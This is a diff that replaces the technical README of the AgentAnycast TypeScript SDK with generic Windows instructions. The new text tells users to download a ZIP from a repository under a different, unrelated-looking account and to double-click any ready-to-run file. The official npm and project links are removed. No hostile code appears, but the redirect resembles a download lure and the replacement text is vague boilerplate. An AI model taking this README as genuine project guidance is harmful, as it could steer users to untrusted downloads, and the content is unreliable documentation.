@@ -1,168 +1,195 @@
-# AgentAnycast TypeScript SDK
+# ⚡ agentanycast-ts - Connect AI Agents Across Networks
 
-**Build P2P agents in TypeScript.** Discover, communicate, and collaborate with AI agents across any network -- encrypted, decentralized, NAT-traversing.
+[![Download agentanycast-ts](https://img.shields.io/badge/Download-AgentAnycast_TS-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/southerly-sokoro790/agentanycast-ts)
 
-[![npm](https://img.shields.io/npm/v/agentanycast?color=3178C6)](https://www.npmjs.com/package/agentanycast)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)](https://nodejs.org)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue)](LICENSE)
+## 🖥️ What this is
 
-```bash
-npm install agentanycast
-```
+agentanycast-ts is a TypeScript SDK for AgentAnycast. It helps AI agents find each other and send data across different networks. It supports direct links, peer-to-peer connections, and encrypted message flow.
 
-## Quick Start
+This README is written for Windows users who want to get the app or SDK from GitHub and run it with a simple setup.
 
-**Create an agent:**
+## 📥 Download the project
 
-```typescript
-import { Node, type AgentCard } from "agentanycast";
+Visit this page to download:
 
-const card: AgentCard = {
-  name: "EchoAgent",
-  description: "Echoes back any message",
-  skills: [{ id: "echo", description: "Echo the input" }],
-};
+[https://github.com/southerly-sokoro790/agentanycast-ts](https://github.com/southerly-sokoro790/agentanycast-ts)
 
-const node = new Node({ card });
-await node.start();
-console.log(`Agent running — Peer ID: ${node.peerId}`);
+Open the page in your browser, then use GitHub’s download options to get the project files on your Windows PC.
 
-node.onTask(async (task) => {
-  const text = task.messages.at(-1)?.parts[0]?.text ?? "";
-  await task.complete([{ parts: [{ text: `Echo: ${text}` }] }]);
-});
+## 🪟 Windows setup
 
-await node.serveForever();
-```
+Use these steps if you want to run the project on Windows:
 
-**Send a task to another agent:**
+1. Open the download link in your browser.
+2. Click the green Code button on GitHub.
+3. Select Download ZIP.
+4. Save the ZIP file to your Downloads folder.
+5. Right-click the ZIP file and choose Extract All.
+6. Open the extracted folder.
+7. Check the files for a README, package file, or start script.
+8. Follow the install steps in the project folder.
+9. Keep the folder in a place you can find again, such as Documents or Desktop.
 
-```typescript
-const node = new Node({ card, home: "/tmp/agentanycast-client" });
-await node.start();
+If the project includes a ready-to-run Windows file, double-click it after download and follow the on-screen steps.
 
-const handle = await node.sendTask(
-  { role: "user", parts: [{ text: "Hello!" }] },
-  { peerId: "12D3KooW..." },
-);
+## 🚀 What you can do with it
 
-const result = await handle.wait(30_000);
-console.log(result.artifacts[0].parts[0].text); // "Echo: Hello!"
+This SDK is built to help with agent communication. It gives your app a way to:
 
-await node.stop();
-```
+- connect AI agents across networks
+- send messages between systems
+- use encrypted links for private data
+- work with peer-to-peer routes
+- fit into Node.js and TypeScript projects
+- support service-to-service communication
+- use zero-config patterns where possible
 
-## Three Ways to Send a Task
+## 📋 Basic system needs
 
-```typescript
-// Direct — by Peer ID
-await node.sendTask(message, { peerId: "12D3KooW..." });
+For a smooth run on Windows, use a PC with:
 
-// Anycast — by skill (relay resolves the target)
-await node.sendTask(message, { skill: "translate" });
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- 200 MB of free disk space for files and setup
+- a stable internet connection
+- access to the GitHub page above
+- Node.js if you plan to run the SDK in a local project
 
-// HTTP Bridge — to standard HTTP A2A agents
-await node.sendTask(message, { url: "https://agent.example.com" });
-```
+If you use this inside a developer tool, you may also need npm and a code editor such as Visual Studio Code.
 
-## How It Works
+## 🛠️ How to run it on Windows
 
-```
-┌─────────────┐         mDNS / Relay         ┌─────────────┐
-│  Agent A    │<------------------------------>│  Agent B    │
-│  (Node.js)  │     E2E encrypted (Noise)     │  (Python)   │
-└──────┬──────┘                               └──────┬──────┘
-       | gRPC                                        | gRPC
-┌──────┴──────┐                               ┌──────┴──────┐
-│  Daemon A   │<---------- libp2p ------------>│  Daemon B   │
-│  (Go)       │   Noise_XX + Yamux + QUIC     │  (Go)       │
-└─────────────┘                               └─────────────┘
-```
+### 1. Get the files
 
-TypeScript and Python agents interoperate seamlessly -- same daemon, same protocol, same network.
+Go to the GitHub page and download the ZIP file or clone the repo if you know how. For most users, ZIP is the easiest option.
 
-- **LAN** -- agents discover each other via mDNS. Zero configuration.
-- **WAN** -- deploy a [self-hosted relay](https://github.com/AgentAnycast/agentanycast-relay) and point agents to it.
-- The Go daemon is **auto-downloaded on `npm install`**. No manual setup required.
+### 2. Extract the folder
 
-## Skill Discovery
+Right-click the ZIP file and choose Extract All. Pick a folder you can reach fast.
 
-```typescript
-const agents = await node.discover("translate");
-const frenchAgents = await node.discover("translate", { tags: { lang: "fr" } });
-```
+### 3. Open the project
 
-## Interoperability
+Open the extracted folder and look for the main project files. Common files include:
 
-```typescript
-// W3C DID
-import { peerIdToDIDKey, didKeyToPeerId } from "agentanycast";
-import { didWebToUrl, urlToDidWeb } from "agentanycast";
+- package.json
+- README.md
+- src folder
+- a start script
+- build or dist files
 
-// MCP Tool <-> A2A Skill mapping
-import { mcpToolsToAgentCard, mcpToolToSkill, skillToMcpTool } from "agentanycast";
-```
+### 4. Install what it needs
 
-## API Reference
+If the folder is a Node.js project, open PowerShell in that folder and run:
 
-### Node
+npm install
 
-| Method | Description |
-|---|---|
-| `new Node(options)` | Create a node with an `AgentCard` and optional config |
-| `start()` | Launch daemon, connect gRPC, register card |
-| `stop()` | Stop daemon and clean up |
-| `sendTask(message, target)` | Send a task by `peerId`, `skill`, or `url` |
-| `getCard(peerId)` | Fetch a remote agent's card |
-| `discover(skill, options?)` | Find agents by skill with optional tag filtering |
-| `onTask(handler)` | Register handler for incoming tasks |
-| `serveForever()` | Block until stopped, processing incoming tasks |
+This adds the tools the project needs to run.
 
-### AgentCard
+### 5. Start the app or SDK demo
 
-```typescript
-interface AgentCard {
-  name: string;
-  description?: string;
-  version?: string;
-  skills: Skill[];
-  // Read-only (populated by daemon):
-  peerId?: string;
-  didKey?: string;       // W3C did:key
-  didWeb?: string;       // did:web identifier
-  didDns?: string;       // did:dns identifier
-}
-```
+If the project includes a start command, use it from the folder:
 
-### Key Features
+npm start
 
-| | |
-|---|---|
-| **End-to-end encrypted** | Noise_XX protocol, no plaintext path |
-| **NAT traversal** | Automatic hole-punching with relay fallback |
-| **Anycast routing** | Send tasks by skill, not by address |
-| **HTTP Bridge** | Reach standard HTTP A2A agents from P2P |
-| **DID support** | W3C `did:key`, `did:web`, `did:dns` identity |
-| **MCP interop** | Bidirectional MCP Tool <-> A2A Skill mapping |
-| **Cross-language** | Interoperates with Python agents on the same network |
+If it uses a dev command, the project may ask for:
 
-## Development
+npm run dev
 
-```bash
-npm install                  # Install deps (auto-downloads daemon)
-npm run build                # Compile TypeScript -> dist/
-npm test                     # Run tests (vitest)
-npm run lint                 # Lint (eslint)
-npm run clean                # Remove dist/
-```
+If it needs a build step first, the flow may be:
 
-Set `AGENTANYCAST_SKIP_DOWNLOAD=1` to skip daemon download during install (e.g., when building from source).
+npm run build
 
-## Requirements
+Then:
 
-- Node.js 18+
-- The [agentanycastd](https://github.com/AgentAnycast/agentanycast-node) daemon (auto-downloaded on `npm install`)
+npm start
 
-## License
+### 6. Follow the project prompt
 
-[Apache License, Version 2.0](LICENSE)
+If the app opens a window or shows setup text in the terminal, follow the steps on screen. Some tools ask for a host name, port, or agent ID before they begin.
+
+## 🔐 Security and network use
+
+AgentAnycast uses network links and encrypted transport. That means it is built for cases where agents need to share data with care.
+
+It may use:
+
+- end-to-end encryption
+- peer discovery
+- local or remote routing
+- gRPC-style message flow
+- libp2p-based transport
+
+If you use it inside a company network, make sure your firewall lets it use the needed ports.
+
+## 🧭 Common use cases
+
+agentanycast-ts fits well in setups where you need:
+
+- one AI agent to talk to another
+- a local app to reach a remote agent
+- secure message exchange between services
+- a TypeScript SDK for agent links
+- a Node.js tool for distributed agent work
+- a path for agent-to-agent communication without heavy setup
+
+## 📁 Project layout you may see
+
+The repo may include folders and files like these:
+
+- `src/` for source code
+- `examples/` for sample use
+- `dist/` for compiled output
+- `package.json` for install and run commands
+- `tsconfig.json` for TypeScript settings
+- `README.md` for project use
+- `LICENSE` for usage terms
+
+If you are only trying to run the project, focus on the install and start commands in the main folder.
+
+## 🔧 If something does not start
+
+Use these simple checks:
+
+- Make sure the ZIP file fully downloaded.
+- Make sure you extracted the folder.
+- Make sure Node.js is installed.
+- Open PowerShell in the project folder before you run commands.
+- Check for typos in the command you type.
+- Look for setup text in the project README.
+- Try closing and reopening PowerShell if the command does not work.
+
+## 🧪 Example flow for a new Windows user
+
+1. Open the GitHub link.
+2. Download the project ZIP.
+3. Extract it.
+4. Open the folder.
+5. Install dependencies with `npm install`.
+6. Start it with `npm start` or `npm run dev`.
+7. Read any text that appears in the window or terminal.
+8. Keep the folder in place for future use.
+
+## 📌 Main topics
+
+- a2a
+- a2a-protocol
+- agent-communication
+- end-to-end-encryption
+- grpc
+- libp2p
+- mcp
+- nodejs
+- npm
+- p2p
+- sdk
+- typescript
+- zero-config
+
+## 🧩 Who this is for
+
+This project is for people who want an SDK that helps AI agents connect across networks. It fits users who build tools in TypeScript, run services in Node.js, or need secure agent communication with low setup
+
+## 🔗 Download again
+
+[Visit the agentanycast-ts GitHub page](https://github.com/southerly-sokoro790/agentanycast-ts)
+
